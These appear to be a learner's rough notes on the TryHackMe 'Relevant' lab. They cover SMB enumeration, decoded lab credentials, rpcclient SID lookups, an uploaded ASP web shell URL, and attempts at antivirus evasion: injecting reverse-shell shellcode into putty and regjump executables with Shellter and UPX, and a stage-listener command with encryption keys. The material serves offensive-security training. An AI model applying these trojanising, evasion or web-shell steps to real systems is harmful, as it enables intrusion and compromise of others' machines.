# Relevant Notes

## Data 

IP: 10.10.15.133
OS: Windows Server 2016 Standard Evaluation 14393 x64 
Arch: x64
Hostname: Relevant
DNS:
Domain:  RELEVANT
Domain SID:
Machine Purpose: 
Services: rpc,smbv1, http, rdp
Service Languages: ASP (x-aspnet-version header: 4.0.30319)
Users:
Email and Username Formatting:
Credentials:

- https://steflan-security.com/tryhackme-relevant-walkthrough/
- till `nmap -p 139,445 -Pn --script smb-enum* 10.10.14.1`
- Strike one of wtf I am even doing this machine is behaving so weird for over 3 hours.
#### Mindmap-per Service

- OS detect, run generate noting for nmap
	- OH god the re-scanning finally got there just to fuck with my wanting to script nmap notes... 
	- [[10-Relevant-NMAP-Notes]]
	- weird.cert
	- wtfisgoingonwiththismachine.png 
	- This is the first machine I have ever have nmap fail so bad
	- `nmap -p 139,445 -Pn --script smb-enum* 10.10.14.1` worked but everything else did not?
	- cme share 
-
- http://10.10.157.252:49663/nt4wrksv/cmdasp.aspx
-
-
-
-
-
-
-
-

```
xsel -b  | sed 's/|.//g' > weird.cert
```

#### To do List


Note - Nothing in this room requires Metasploit

```bash
echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d
Bob - !P@$$W0rD!123

echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```


```
echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d && echo "" && echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d

Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$

```


```
rpcclient $> lookupnames bob
bob S-1-5-21-3981879597-1135670737-2718083060-1002 (User: 1)
rpcclient $> lookupnames administrator
administrator S-1-5-21-3981879597-1135670737-2718083060-500 (User: 1)
```

Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)

Mid way through the artcil
```python
python3 -m venv .venv

source .venv/bin/activate 
pip3 install .

# deactivate # To deactivate virtual environment
```



Attempt 1 

Benign C executable that has standard msfvenom shellcode   
- https://www.programiz.com/c-programming/examples/check-armstrong-number
- https://github.com/cocomelonc/meow/blob/master/2021-10-26-windows-shellcoding-1/run.c

Attempt 2 - without msfconsole initially and then with

Use Shellter Inject shell_reverse_tcp shellcode into putty_32.exe
- And a UPXed variant for testing purposes

2.5 - try with regjump.exe
- And a UPXed variant  for testing purposes

It is not flagging the binary, but I am just fling like a monkey and not doing due diligence for sake of just finding the faults in my AV evading 

Attempt 3 



Attempt 


- Can you use 32bit? 
	- Shellter requires you vet the binary to actually be able to execute shell   





```bash
stage-listener --url http://192.168.0.52:80 --profile win-shellcode --aes-encrypt-key D(G+KbPeShVmYq3t --aes-encrypt-iv 8y/B?E(G+KbPeShV

```